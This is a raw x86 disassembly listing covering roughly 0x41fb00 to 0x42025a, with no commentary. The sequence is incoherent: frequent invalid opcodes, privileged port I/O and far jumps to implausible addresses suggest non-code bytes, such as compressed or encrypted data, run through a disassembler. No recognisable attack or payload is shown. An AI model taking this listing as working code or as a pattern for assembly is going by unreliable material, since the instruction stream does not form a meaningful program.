  41fb00:	imul   ebx,DWORD PTR [edi],0x233e84ee
  41fb06:	adc    ebp,esp
  41fb08:	test   al,0xf3
  41fb0a:	pop    edi
  41fb0b:	mov    eax,ds:0x2d6f6899
  41fb10:	repz (bad) 
  41fb12:	sar    BYTE PTR [edx],0x53
  41fb15:	jge    0x41fb19
  41fb17:	push   0x1e
  41fb19:	popf   
  41fb1a:	into   
  41fb1b:	sub    BYTE PTR ds:0x6aa1370f,cl
  41fb21:	cmp    DWORD PTR [eax],esi
  41fb23:	fld    QWORD PTR [esi]
  41fb25:	xchg   esp,eax
  41fb26:	lea    ebp,ds:0x16eb1f7c
  41fb2c:	sbb    dl,BYTE PTR [eax+0x75]
  41fb2f:	(bad)  
  41fb31:	mov    eax,0x6150f477
  41fb36:	xchg   esi,eax
  41fb37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb38:	adc    dl,BYTE PTR [edi]
  41fb3a:	mov    eax,0x8688554b
  41fb3f:	inc    ebx
  41fb40:	pop    ebp
  41fb41:	bound  ecx,QWORD PTR [edi+ebx*8-0x1cd95f89]
  41fb48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb49:	inc    esp
  41fb4a:	sbb    BYTE PTR [ecx-0x7f],dh
  41fb4d:	and    DWORD PTR [edx+0x3987fba0],edi
  41fb53:	xor    dh,BYTE PTR [ebp-0x74]
  41fb56:	test   eax,0x5805e76
  41fb5b:	jbe    0x41faf4
  41fb5d:	hlt    
  41fb5e:	lea    esp,[ebx+ecx*2+0x1e99575f]
  41fb65:	js     0x41fbe3
  41fb67:	jae    0x41fbe7
  41fb69:	xor    dl,dl
  41fb6b:	xchg   ebp,eax
  41fb6c:	fs repnz iret 
  41fb6f:	test   ebx,ebp
  41fb71:	pusha  
  41fb72:	pop    ecx
  41fb73:	iret   
  41fb74:	(bad)  
  41fb75:	dec    ecx
  41fb76:	adc    esp,DWORD PTR [ecx-0x1df2bbe5]
  41fb7c:	clc    
  41fb7d:	mov    ds:0xce26b264,eax
  41fb82:	nop
  41fb83:	lock pop ebp
  41fb85:	xchg   edi,eax
  41fb86:	(bad)  
  41fb87:	ror    ebp,1
  41fb89:	cdq    
  41fb8a:	push   eax
  41fb8b:	cmp    DWORD PTR [esi+0x40a20b36],eax
  41fb91:	icebp  
  41fb92:	ror    eax,0x6e
  41fb95:	cwde   
  41fb96:	adc    DWORD PTR [esi+esi*4+0x7a],0x915e84fd
  41fb9e:	adc    al,0x22
  41fba0:	nop
  41fba1:	stos   BYTE PTR es:[edi],al
  41fba2:	mov    ch,0x16
  41fba4:	inc    edx
  41fba5:	popa   
  41fba6:	or     cl,BYTE PTR [edx+0x5d]
  41fba9:	push   ds
  41fbaa:	lea    ebx,[ebx]
  41fbac:	jno    0x41fbcf
  41fbae:	out    dx,al
  41fbaf:	add    BYTE PTR [esi-0x71af8e73],bl
  41fbb5:	ss xchg edx,eax
  41fbb7:	imul   ecx,ebp,0xffffffb0
  41fbba:	or     BYTE PTR [ecx-0x75aa166],ch
  41fbc0:	int3   
  41fbc1:	push   ss
  41fbc2:	jae    0x41fb6a
  41fbc4:	imul   esi,DWORD PTR [edx-0x6576dee3],0x75
  41fbcb:	mov    WORD PTR [esi+0x1c],ds
  41fbce:	lods   eax,DWORD PTR ds:[esi]
  41fbcf:	ss dec edi
  41fbd1:	test   al,0x8c
  41fbd3:	jno    0x41fb76
  41fbd5:	push   edx
  41fbd6:	addr16 jns 0x41fbd2
  41fbd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbda:	iret   
  41fbdb:	loopne 0x41fc1b
  41fbdd:	add    al,0xd8
  41fbdf:	arpl   WORD PTR [edx-0x4f1711a4],bp
  41fbe5:	xchg   ebp,eax
  41fbe6:	fisttp WORD PTR [esi-0x504fb1a3]
  41fbec:	xor    esi,eax
  41fbee:	pop    ds
  41fbef:	pushf  
  41fbf0:	fidivr WORD PTR [ecx+0x1887eef7]
  41fbf6:	call   0x50485a51
  41fbfb:	jbe    0x41fbef
  41fbfd:	jbe    0x41fbec
  41fbff:	imul   edi,DWORD PTR [ecx+0x37002260],0xffffffbd
  41fc06:	jp     0x41fbe9
  41fc08:	dec    ebp
  41fc09:	ss in  eax,dx
  41fc0b:	inc    BYTE PTR [eax]
  41fc0d:	loop   0x41fba9
  41fc0f:	pop    esp
  41fc10:	ss fidivr WORD PTR es:[edx+0x42]
  41fc15:	gs jmp 0xe6b0d655
  41fc1b:	xchg   esp,eax
  41fc1c:	pop    ds
  41fc1d:	mov    eax,ds:0x8f5c1b91
  41fc22:	jmp    0x41fc49
  41fc24:	ret    0xeafc
  41fc27:	fdivrp st(4),st
  41fc29:	cwde   
  41fc2a:	arpl   WORD PTR fs:[eax+0x61],bp
  41fc2e:	fcom   st(4)
  41fc30:	inc    ebx
  41fc31:	stos   BYTE PTR es:[edi],al
  41fc32:	retf   
  41fc33:	cwde   
  41fc34:	loope  0x41fc6e
  41fc36:	out    dx,al
  41fc37:	jno    0x41fbce
  41fc39:	shl    BYTE PTR [ebp+0x4c1f13e0],cl
  41fc3f:	mov    eax,ds:0x52b49141
  41fc44:	mov    dl,0x8a
  41fc46:	shl    esp,0x5e
  41fc49:	xor    ch,ch
  41fc4b:	out    dx,eax
  41fc4c:	rol    DWORD PTR [ebp+ebx*4-0x72a0f084],0x51
  41fc54:	mov    edx,0x7e2d3213
  41fc59:	fild   WORD PTR [esi+0x69eb6334]
  41fc5f:	lea    edi,[edx]
  41fc61:	and    DWORD PTR [ebx],esi
  41fc63:	(bad)  
  41fc64:	mov    edi,0x37a0e5ac
  41fc69:	fs push edx
  41fc6b:	mov    DWORD PTR [ebx+0x1d],ebx
  41fc6e:	xchg   ebp,eax
  41fc6f:	push   ebp
  41fc70:	pop    ebp
  41fc71:	adc    al,ch
  41fc73:	push   dx
  41fc75:	add    DWORD PTR [ebx+0x25fc1ea4],0x1960b12a
  41fc7f:	fcom   st(3)
  41fc81:	cdq    
  41fc82:	sbb    BYTE PTR [edi-0x3a115ad3],0x22
  41fc89:	int3   
  41fc8a:	and    edi,DWORD PTR [ebp-0x7232b982]
  41fc90:	scas   eax,DWORD PTR es:[edi]
  41fc91:	xchg   ecx,eax
  41fc92:	test   BYTE PTR [ecx+0x32],ah
  41fc95:	dec    edx
  41fc96:	push   dx
  41fc98:	pop    ecx
  41fc99:	in     eax,0x2
  41fc9b:	pop    es
  41fc9c:	clc    
  41fc9d:	fsubp  st(6),st
  41fc9f:	inc    ebp
  41fca0:	mov    ah,0xfa
  41fca2:	mov    ebp,0xc6a2df27
  41fca7:	mov    al,ds:0xc88d91cf
  41fcac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcad:	mov    ds:0xcc5e8bf4,al
  41fcb2:	mov    edi,0x80a49830
  41fcb7:	sub    ecx,DWORD PTR [edx+0x61]
  41fcba:	pushf  
  41fcbb:	sbb    BYTE PTR [ecx],cl
  41fcbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcbe:	and    DWORD PTR [ebp+edi*1-0x2b],edi
  41fcc2:	jmp    0x41fd2b
  41fcc4:	outs   dx,BYTE PTR ds:[esi]
  41fcc5:	xor    eax,0xd90e25e0
  41fcca:	in     eax,dx
  41fccb:	enter  0x52ce,0xf7
  41fccf:	lea    edx,fs:[ecx-0x72]
  41fcd3:	push   0x55
  41fcd5:	dec    BYTE PTR [ecx+0x13955e45]
  41fcdb:	imul   esi,DWORD PTR [esi],0x9d221cb8
  41fce1:	sub    DWORD PTR [ecx+eiz*4+0x3a],ebp
  41fce5:	cmc    
  41fce6:	push   edx
  41fce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fce8:	mov    WORD PTR fs:[esi],gs
  41fceb:	loop   0x41fd48
  41fced:	pushf  
  41fcee:	jp     0x41fd11
  41fcf0:	stc    
  41fcf1:	pop    edx
  41fcf2:	mov    fs,ebp
  41fcf4:	into   
  41fcf5:	jno    0x41fc7d
  41fcf7:	(bad)  
  41fcf8:	int3   
  41fcf9:	push   esi
  41fcfa:	xchg   DWORD PTR [ecx-0x1802eb2c],esp
  41fd00:	push   eax
  41fd01:	int    0x4c
  41fd03:	dec    ebx
  41fd04:	pop    esi
  41fd05:	jmp    0x37b57b5e
  41fd0a:	mov    edi,0xca5a4a9b
  41fd0f:	jmp    0x40f793fa
  41fd14:	push   cs
  41fd15:	test   DWORD PTR [esi],edx
  41fd17:	(bad)  
  41fd18:	pop    esi
  41fd19:	push   cs
  41fd1a:	xor    BYTE PTR [esi-0x1e8ce372],ch
  41fd20:	fisub  WORD PTR [eax+0x72]
  41fd23:	add    BYTE PTR [ebx+0x646903d8],dl
  41fd29:	mov    dh,ch
  41fd2b:	ds ds (bad) 
  41fd2f:	shl    DWORD PTR [ebx],0x1e
  41fd32:	popa   
  41fd33:	test   al,0xe
  41fd35:	mov    ah,0x75
  41fd37:	mov    dh,0x93
  41fd39:	push   eax
  41fd3a:	jb     0x41fd41
  41fd3c:	sub    esp,DWORD PTR [edi-0x1f6ac301]
  41fd42:	scas   al,BYTE PTR es:[edi]
  41fd43:	pop    ss
  41fd44:	xor    ch,ch
  41fd46:	jecxz  0x41fd86
  41fd48:	fsub   QWORD PTR [eax-0x1a]
  41fd4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd4c:	pop    edx
  41fd4d:	shl    DWORD PTR [eax-0x6],0x7
  41fd51:	lahf   
  41fd52:	dec    eax
  41fd53:	neg    BYTE PTR [esi-0x8]
  41fd56:	pop    esp
  41fd57:	mov    eax,DWORD PTR [ebx]
  41fd59:	xchg   edi,eax
  41fd5a:	cld    
  41fd5b:	mov    edx,ebx
  41fd5d:	pusha  
  41fd5e:	mov    al,ds:0x162dcea5
  41fd63:	add    BYTE PTR gs:[ebx],dh
  41fd66:	in     eax,0xdb
  41fd68:	pop    edi
  41fd69:	push   edx
  41fd6a:	adc    al,BYTE PTR ds:0x28ec37eb
  41fd70:	sbb    al,0x28
  41fd72:	imul   esp,DWORD PTR [ecx-0x641f61ba],0xe571878e
  41fd7c:	pop    ecx
  41fd7d:	test   eax,0xe568a786
  41fd82:	outs   dx,BYTE PTR ds:[esi]
  41fd83:	dec    esp
  41fd84:	mov    edx,DWORD PTR ss:[eax+0x75076ca1]
  41fd8b:	jbe    0x41fd2d
  41fd8d:	dec    eax
  41fd8e:	cmp    al,0x2b
  41fd90:	pop    esi
  41fd91:	test   BYTE PTR [eax+0x1f8baffc],ch
  41fd97:	or     esi,edx
  41fd99:	pusha  
  41fd9a:	xchg   ebp,eax
  41fd9b:	addr16 hlt 
  41fd9d:	mov    dh,0xb4
  41fd9f:	ins    DWORD PTR es:[edi],dx
  41fda0:	cld    
  41fda1:	pavgb  mm3,QWORD PTR [eax+esi*8-0xe641112]
  41fda9:	fisub  DWORD PTR [edi+0x4c6583cc]
  41fdaf:	mov    eax,ds:0xcbbe859e
  41fdb4:	test   eax,0x7454d87b
  41fdb9:	pop    ebx
  41fdba:	out    0x55,eax
  41fdbc:	and    DWORD PTR [ebp+0x125e85df],edi
  41fdc2:	(bad)  
  41fdc3:	in     al,dx
  41fdc4:	test   BYTE PTR [eax+0x7c],ah
  41fdc7:	mov    ah,bl
  41fdc9:	pop    edx
  41fdca:	add    cl,bh
  41fdcc:	add    eax,0x4b18eee5
  41fdd1:	mov    eax,ds:0xc21f2273
  41fdd6:	xchg   ebx,eax
  41fdd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdd8:	mov    bh,BYTE PTR [ecx+0x20416b03]
  41fdde:	jbe    0x41fde8
  41fde0:	cs dec di
  41fde3:	imul   ecx,ebx,0x7ebefffa
  41fde9:	bound  ebp,QWORD PTR [esi-0x5a8833b3]
  41fdef:	ret    
  41fdf0:	stos   DWORD PTR es:[edi],eax
  41fdf1:	pop    ecx
  41fdf2:	push   eax
  41fdf3:	dec    ebp
  41fdf4:	push   eax
  41fdf5:	in     al,0x2
  41fdf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdf8:	or     eax,0x12976b4
  41fdfd:	fsub   st(6),st
  41fdff:	imul   ax,WORD PTR [ebx+0x97bd52c],0xefc6
  41fe08:	stos   DWORD PTR es:[edi],eax
  41fe09:	pusha  
  41fe0a:	gs out 0xac,eax
  41fe0d:	mov    al,0x49
  41fe0f:	in     al,dx
  41fe10:	xchg   ebp,eax
  41fe11:	jg     0x41fe5d
  41fe13:	adc    ebx,DWORD PTR [esi+0x6d]
  41fe16:	aam    0x2
  41fe18:	sar    esi,0xba
  41fe1b:	pop    ds
  41fe1c:	lds    esi,FWORD PTR [ecx-0x62]
  41fe1f:	lods   al,BYTE PTR ds:[esi]
  41fe20:	mov    ebp,es
  41fe22:	out    dx,al
  41fe23:	call   0x5de7:0x5472dec9
  41fe2a:	xor    al,BYTE PTR [edi-0x5c]
  41fe2d:	push   ecx
  41fe2e:	cmp    ah,BYTE PTR [esi]
  41fe30:	out    0xd9,al
  41fe32:	xchg   ebp,eax
  41fe33:	test   BYTE PTR [esp+eax*2],bh
  41fe36:	cmc    
  41fe37:	mov    DWORD PTR [esi-0x4f],ebx
  41fe3a:	or     BYTE PTR [ecx+ecx*2],ch
  41fe3d:	push   esp
  41fe3e:	sti    
  41fe3f:	mov    ds:0xae6b9c81,eax
  41fe44:	push   esp
  41fe45:	or     BYTE PTR [esi-0x13],ah
  41fe48:	pop    es
  41fe49:	mov    ecx,0xec58284a
  41fe4e:	mov    cl,0xee
  41fe50:	jbe    0x41fe72
  41fe52:	clc    
  41fe53:	mov    ebx,0xa2ae4205
  41fe58:	and    al,0xa0
  41fe5a:	mov    dh,0x38
  41fe5c:	jmp    0x41fe03
  41fe5e:	push   edx
  41fe5f:	pop    ecx
  41fe60:	inc    ebp
  41fe61:	jns    0x41fe25
  41fe63:	lock pushf 
  41fe65:	pusha  
  41fe66:	cmp    dh,ah
  41fe68:	in     al,0xaa
  41fe6a:	jno    0x41fe46
  41fe6c:	hlt    
  41fe6d:	enter  0xa0cb,0x4e
  41fe71:	loope  0x41fee2
  41fe73:	cdq    
  41fe74:	xor    DWORD PTR [edi],ecx
  41fe76:	stos   DWORD PTR es:[di],eax
  41fe78:	adc    dl,BYTE PTR ds:0x895ee9bd
  41fe7e:	xchg   cl,dh
  41fe80:	xchg   BYTE PTR [edi+0x60cea415],cl
  41fe86:	rcr    DWORD PTR [ebx+0x74],1
  41fe89:	add    bh,bh
  41fe8b:	shr    DWORD PTR [esi+0x264d61fd],cl
  41fe91:	dec    ebx
  41fe92:	jmp    0x41fec3
  41fe94:	daa    
  41fe95:	inc    ebp
  41fe96:	jno    0x41fe4b
  41fe98:	xor    bl,BYTE PTR [ecx+0x60f26e11]
  41fe9e:	xabort 0x1a
  41fea1:	cwde   
  41fea2:	(bad)  
  41fea3:	and    bl,al
  41fea5:	sub    ebp,esi
  41fea7:	push   esp
  41fea8:	lea    eax,[edx]
  41feaa:	ret    
  41feab:	lock iret 
  41fead:	dec    edx
  41feae:	retf   0x3ba0
  41feb1:	mov    ah,0x68
  41feb3:	imul   ecx,DWORD PTR ds:0x5e91a19c,0xa9d925da
  41febd:	out    0xef,eax
  41febf:	or     eax,0xa18329bc
  41fec4:	retf   
  41fec5:	adc    ch,0xea
  41fec8:	stc    
  41fec9:	pop    ebx
  41feca:	pop    ecx
  41fecb:	pop    ebx
  41fecc:	jmp    0xe586ed8b
  41fed1:	cmp    BYTE PTR [esi+0xc4320c4],cl
  41fed7:	mov    ds:0xeb190c8f,eax
  41fedc:	xchg   BYTE PTR [ecx],dh
  41fede:	scas   al,BYTE PTR es:[edi]
  41fedf:	dec    edx
  41fee0:	aam    0x5b
  41fee2:	sahf   
  41fee3:	adc    DWORD PTR [edx+0x33],ebp
  41fee6:	out    dx,al
  41fee7:	sub    ebx,esp
  41fee9:	cli    
  41feea:	xchg   esi,eax
  41feeb:	jge    0x41ff0c
  41feed:	cdq    
  41feee:	scas   al,BYTE PTR es:[edi]
  41feef:	mov    eax,ds:0xe69d468e
  41fef4:	pop    DWORD PTR [eax-0x43]
  41fef7:	sbb    BYTE PTR ds:0x2a112370,0x52
  41fefe:	adc    edx,DWORD PTR [ebp-0x7463bf88]
  41ff04:	and    ah,ah
  41ff06:	inc    edx
  41ff07:	mov    ds:0xc1fcb89a,al
  41ff0c:	inc    edx
  41ff0d:	or     ch,BYTE PTR [ecx+0x1]
  41ff10:	or     BYTE PTR [edx-0x11],0x72
  41ff14:	mov    bl,0xeb
  41ff16:	inc    edi
  41ff17:	popa   
  41ff18:	stc    
  41ff19:	add    eax,0x2cadfd85
  41ff1e:	cmp    cl,BYTE PTR [edi+0x6f695100]
  41ff24:	fiadd  WORD PTR [esi+0xf]
  41ff27:	repnz adc ch,bl
  41ff2a:	push   ebp
  41ff2b:	push   esi
  41ff2c:	pop    esi
  41ff2d:	fisttp QWORD PTR [edx-0x14]
  41ff30:	imul   esp,esp,0xffffffca
  41ff33:	push   ss
  41ff34:	xchg   edx,eax
  41ff35:	pusha  
  41ff36:	and    al,0x3b
  41ff38:	outs   dx,DWORD PTR ds:[esi]
  41ff39:	arpl   dx,di
  41ff3b:	pop    DWORD PTR [edx+0x48d8eea6]
  41ff41:	fisttp DWORD PTR [esi]
  41ff43:	into   
  41ff44:	mov    edi,0x248d7ab9
  41ff49:	or     eax,0xe7e6e13e
  41ff4e:	mov    esi,0xeef58db9
  41ff53:	repnz or al,0x3f
  41ff56:	xor    al,0x9
  41ff58:	outs   dx,BYTE PTR ds:[esi]
  41ff59:	mov    edi,0x6195a18d
  41ff5e:	or     esi,esi
  41ff60:	mov    edi,0x5fa5975f
  41ff65:	inc    edx
  41ff66:	sbb    al,0xd2
  41ff68:	push   ebp
  41ff69:	call   0x3f033843
  41ff6e:	daa    
  41ff6f:	mov    eax,ds:0x1c580e21
  41ff74:	xchg   ebx,eax
  41ff75:	adc    DWORD PTR [ebx+0x33],ecx
  41ff78:	arpl   bp,si
  41ff7a:	out    0x71,eax
  41ff7c:	test   eax,0x45759a80
  41ff81:	loope  0x41ff58
  41ff83:	push   0xfffffff1
  41ff85:	arpl   cx,di
  41ff87:	lods   eax,DWORD PTR ds:[esi]
  41ff88:	pop    esi
  41ff89:	stos   DWORD PTR es:[edi],eax
  41ff8a:	(bad)  
  41ff8b:	stos   BYTE PTR es:[edi],al
  41ff8c:	in     al,dx
  41ff8d:	test   al,0x6
  41ff8f:	outs   dx,BYTE PTR ds:[esi]
  41ff90:	pop    esi
  41ff91:	adc    BYTE PTR [edx],ah
  41ff93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff94:	jo     0x41ff71
  41ff96:	xchg   edi,eax
  41ff97:	or     BYTE PTR [ebx+ecx*2+0x57],bl
  41ff9b:	push   esp
  41ff9c:	mov    dl,0x60
  41ff9e:	inc    ebp
  41ff9f:	cmp    eax,0x6aefd1d6
  41ffa4:	scas   al,BYTE PTR es:[edi]
  41ffa5:	into   
  41ffa6:	out    dx,al
  41ffa7:	lds    ebp,FWORD PTR ss:[esi*1-0x76f9bb22]
  41ffaf:	lahf   
  41ffb0:	sub    al,0x36
  41ffb2:	dec    edi
  41ffb3:	xlat   BYTE PTR ds:[ebx]
  41ffb4:	dec    bl
  41ffb6:	pop    eax
  41ffb7:	or     eax,0xf925ebc3
  41ffbc:	lods   al,BYTE PTR ds:[esi]
  41ffbd:	loopne 0x41ffd4
  41ffbf:	sub    BYTE PTR [edi+ebp*2+0x63],al
  41ffc3:	cs sti 
  41ffc5:	pusha  
  41ffc6:	xchg   ebp,eax
  41ffc7:	ret    
  41ffc8:	mov    eax,0x118766f4
  41ffcd:	xor    bl,dl
  41ffcf:	xchg   esp,eax
  41ffd0:	pop    edi
  41ffd1:	neg    DWORD PTR [ecx+ecx*2+0x69]
  41ffd5:	and    DWORD PTR [esi+0x61],edx
  41ffd8:	sti    
  41ffd9:	rcr    DWORD PTR ds:0xd943a275,1
  41ffdf:	(bad)  
  41ffe0:	fwait
  41ffe1:	pusha  
  41ffe2:	das    
  41ffe3:	stos   BYTE PTR es:[edi],al
  41ffe4:	cmp    eax,0x5f4a3089
  41ffe9:	cwde   
  41ffea:	push   0xffffffde
  41ffec:	sub    dh,BYTE PTR [ecx+0x63f020b5]
  41fff2:	mov    eax,ss:0xc4b20ca9
  41fff8:	into   
  41fff9:	retf   0x78fa
  41fffc:	pop    ebx
  41fffd:	jmp    0x42007c
  41ffff:	clc    
  420000:	pop    ebp
  420001:	imul   DWORD PTR [esi+0x1a]
  420004:	push   ds
  420005:	inc    eax
  420006:	into   
  420007:	mov    al,ds:0x9030e5a6
  42000c:	cs int3 
  42000e:	and    DWORD PTR [esi+0x5e],0x3a
  420012:	push   esp
  420013:	mov    ebx,0xff7015a0
  420018:	push   ebp
  420019:	xor    BYTE PTR [ecx-0x5f],dh
  42001c:	out    0x77,al
  42001e:	inc    edi
  42001f:	(bad)  
  420020:	lock sbb al,0xa9
  420023:	lds    ebx,FWORD PTR [esi-0x1a]
  420026:	sub    al,0xcc
  420028:	imul   ebp,ebx,0xffffffcc
  42002b:	fs pop esp
  42002d:	popa   
  42002e:	xor    DWORD PTR [esi+0x71473435],edi
  420034:	cmp    BYTE PTR [ecx-0x12],dl
  420037:	je     0x420048
  420039:	loopne 0x41ffde
  42003b:	fdivr  st(0),st
  42003d:	sbb    bl,al
  42003f:	mov    al,ds:0x75dba2e0
  420044:	into   
  420045:	dec    edi
  420046:	popa   
  420047:	push   edi
  420048:	cmp    bl,bh
  42004a:	pop    esp
  42004b:	and    eax,ebx
  42004d:	xchg   ecx,eax
  42004e:	fsubr  DWORD PTR [edx-0x5ff6ee2f]
  420054:	or     dl,BYTE PTR [edx+0x74]
  420057:	je     0x420017
  420059:	mov    DWORD PTR [ecx],edx
  42005b:	mov    edi,0xa3eede12
  420060:	or     eax,0x781dfe94
  420065:	rol    DWORD PTR [eax+eiz*4-0x7f6230de],1
  42006c:	fisub  WORD PTR [edi+0x31bf6790]
  420072:	jmp    0x4200c6
  420074:	xor    BYTE PTR [ebp+0x11fce4b],0xaa
  42007b:	arpl   WORD PTR [esi-0x3b6014a0],sp
  420081:	icebp  
  420082:	or     ch,BYTE PTR [ecx-0x2a4d2e7e]
  420088:	mov    eax,ds:0x6edc5060
  42008d:	push   cs
  42008e:	lea    ebp,[edi-0x28]
  420091:	pusha  
  420092:	ret    0x97d7
  420095:	ret    0x2a7b
  420098:	stos   DWORD PTR es:[edi],eax
  420099:	or     eax,0x1bd92eee
  42009e:	dec    esi
  42009f:	popf   
  4200a0:	mov    esi,0xc5ec6dd1
  4200a5:	pusha  
  4200a6:	inc    ebp
  4200a7:	and    edx,ebp
  4200a9:	xchg   ebp,eax
  4200aa:	sbb    BYTE PTR ss:[ebp+0x6f],0xee
  4200af:	cdq    
  4200b0:	jnp    0x4200f6
  4200b2:	sbb    eax,0x1702a4c6
  4200b7:	lahf   
  4200b8:	sub    BYTE PTR cs:[esi+eiz*8+0x3543cf9e],dl
  4200c0:	lods   al,BYTE PTR ds:[esi]
  4200c1:	les    ecx,FWORD PTR [edx-0x42]
  4200c4:	pop    esi
  4200c5:	inc    ecx
  4200c6:	icebp  
  4200c7:	dec    ecx
  4200c8:	stos   DWORD PTR es:[edi],eax
  4200c9:	fmul   DWORD PTR [eax]
  4200cb:	icebp  
  4200cc:	outs   dx,DWORD PTR ds:[esi]
  4200cd:	pusha  
  4200ce:	(bad)  
  4200d0:	jae    0x42012c
  4200d2:	fstp   QWORD PTR [edi]
  4200d4:	jge    0x42007f
  4200d6:	div    DWORD PTR [ebx]
  4200d8:	aas    
  4200d9:	rcl    DWORD PTR [ecx+eiz*4-0x5d],1
  4200dd:	test   BYTE PTR [esi-0x231c4f72],ah
  4200e3:	fnstcw WORD PTR [edx+ebp*8]
  4200e6:	sbb    eax,esi
  4200e8:	push   ebx
  4200e9:	or     bh,BYTE PTR [ecx+edi*4-0x1ed29ca2]
  4200f0:	xlat   BYTE PTR ds:[ebx]
  4200f1:	loop   0x420130
  4200f3:	icebp  
  4200f4:	push   ecx
  4200f5:	popa   
  4200f6:	mov    ds:0xbf6d09ef,eax
  4200fb:	adc    BYTE PTR [ebp-0x77],dl
  4200fe:	out    dx,al
  4200ff:	leave  
  420100:	dec    eax
  420101:	mov    ds:0xdad0023c,eax
  420106:	pop    ebx
  420107:	jmp    0x9565:0x2f405a66
  42010e:	mov    ecx,edx
  420110:	xchg   dh,ah
  420112:	inc    esi
  420113:	(bad)  
  420114:	pop    esi
  420115:	xchg   esi,eax
  420116:	xchg   ebp,eax
  420117:	mov    ds:0xcf80a57a,al
  42011c:	out    dx,eax
  42011d:	arpl   WORD PTR [eax-0x4e],cx
  420120:	pop    esi
  420121:	retf   0xa881
  420124:	lods   eax,DWORD PTR ds:[esi]
  420125:	sbb    al,0x41
  420127:	jns    0x420186
  420129:	xchg   edx,eax
  42012a:	xchg   edi,eax
  42012b:	jmp    0xe73d1474
  420130:	mov    al,BYTE PTR [eax]
  420132:	push   ss
  420133:	lods   al,BYTE PTR ds:[esi]
  420134:	push   0xffffffcd
  420136:	out    dx,al
  420137:	sbb    al,0xed
  420139:	inc    edx
  42013a:	dec    ebp
  42013b:	sub    ah,BYTE PTR [ebp-0x4a]
  42013e:	in     eax,dx
  42013f:	pop    ebx
  420140:	neg    DWORD PTR [edx+edi*2]
  420143:	cmc    
  420144:	mov    esp,0xaa034a40
  420149:	pop    edi
  42014a:	fstp   st(4)
  42014c:	lods   al,BYTE PTR ds:[esi]
  42014d:	mov    ebp,0x9905895a
  420152:	sbb    bl,BYTE PTR [esi+0x34]
  420155:	das    
  420156:	mov    ch,BYTE PTR [ecx]
  420158:	out    0xe0,al
  42015a:	xchg   edi,eax
  42015b:	dec    esi
  42015c:	mov    ds:0x2e41ea9c,al
  420161:	popa   
  420162:	shl    BYTE PTR [eax],1
  420164:	fnsave [ecx]
  420166:	ds popf 
  420168:	xor    al,0x3d
  42016a:	jle    0x42019d
  42016c:	pop    esi
  42016d:	out    dx,eax
  42016e:	xor    esi,DWORD PTR [ebp+0x12]
  420171:	sti    
  420172:	dec    ebx
  420173:	xchg   ebp,eax
  420174:	sahf   
  420175:	pusha  
  420176:	xor    DWORD PTR [ecx],ebp
  420178:	pop    edi
  420179:	aad    0x21
  42017b:	sub    al,0x23
  42017d:	and    ebp,esi
  42017f:	call   0xc92c1f50
  420184:	xchg   edi,eax
  420185:	lods   eax,DWORD PTR ds:[esi]
  420186:	call   0xdddc:0x6d6c269c
  42018d:	jecxz  0x4201e0
  42018f:	(bad)  
  420190:	ret    0xfc84
  420193:	or     esi,DWORD PTR ds:0xee213198
  420199:	cmp    al,0xf6
  42019b:	shl    BYTE PTR [edi-0x43],0x58
  42019f:	mov    DWORD PTR [edx+0x45],esp
  4201a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201a3:	add    DWORD PTR ds:0x924ed4f,esp
  4201a9:	aad    0xcb
  4201ab:	div    ch
  4201ad:	(bad)  
  4201ae:	into   
  4201af:	sbb    al,bh
  4201b1:	pusha  
  4201b2:	mov    al,0x5
  4201b4:	pop    edi
  4201b5:	out    0x51,al
  4201b7:	ja     0x4201bc
  4201b9:	cwde   
  4201ba:	loope  0x420147
  4201bc:	pop    ebp
  4201bd:	sti    
  4201be:	sbb    eax,0x18d8e59
  4201c3:	leave  
  4201c4:	mov    ds:0x596eb1e3,al
  4201c9:	push   edx
  4201ca:	lea    eax,[ecx+eiz*4]
  4201cd:	mov    BYTE PTR [esi-0x5110f606],ch
  4201d3:	shl    BYTE PTR [esi],1
  4201d5:	inc    edx
  4201d6:	adc    esp,DWORD PTR [ecx+0x12e751c7]
  4201dc:	adc    DWORD PTR [ecx-0x6d9d5ed8],ebx
  4201e2:	dec    ebp
  4201e3:	fsub   st,st(1)
  4201e5:	rcr    DWORD PTR ds:0x73ae3630,0xa2
  4201ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201ed:	ss sub eax,0x4663ed3a
  4201f3:	sar    BYTE PTR [ecx+0x60],0x46
  4201f7:	outs   dx,BYTE PTR ds:[esi]
  4201f8:	outs   dx,BYTE PTR ds:[esi]
  4201f9:	in     al,0x63
  4201fb:	cmp    edx,ecx
  4201fd:	push   cs
  4201fe:	push   DWORD PTR [edx-0x52]
  420201:	and    eax,0xe117e833
  420206:	addr16 test eax,ebp
  420209:	out    dx,eax
  42020a:	xchg   edx,eax
  42020b:	clc    
  42020c:	or     esp,DWORD PTR [ecx+0x1f]
  42020f:	lods   al,BYTE PTR ds:[esi]
  420210:	mov    ch,0x9d
  420212:	int3   
  420213:	cli    
  420214:	add    bl,BYTE PTR [edi-0x12]
  420217:	pushf  
  420218:	mov    edi,0x98dd5762
  42021d:	inc    ecx
  42021e:	in     eax,0xa3
  420220:	jno    0x42027a
  420222:	mov    DWORD PTR [eax],esi
  420224:	mov    edx,0x169b9ecc
  420229:	fs out 0x80,eax
  42022c:	lock add eax,0xdcfe2a63
  420232:	into   
  420233:	aaa    
  420234:	sbb    eax,0xc74e2e5a
  420239:	ds dec ecx
  42023b:	push   0x297b7122
  420240:	xchg   BYTE PTR [edi-0x12],ah
  420243:	mov    WORD PTR [ebp-0x33],es
  420246:	pop    edx
  420247:	adc    esi,edx
  420249:	scas   al,BYTE PTR es:[edi]
  42024a:	mov    eax,0x1e387aa0
  42024f:	popa   
  420250:	and    BYTE PTR [ecx],cl
  420252:	inc    eax
  420253:	mov    ch,0x5e
  420255:	out    dx,eax
  420256:	in     al,0xf2
  420258:	dec    esp
  420259:	xchg   esp,eax
  42025a:	jmp    0x4202af
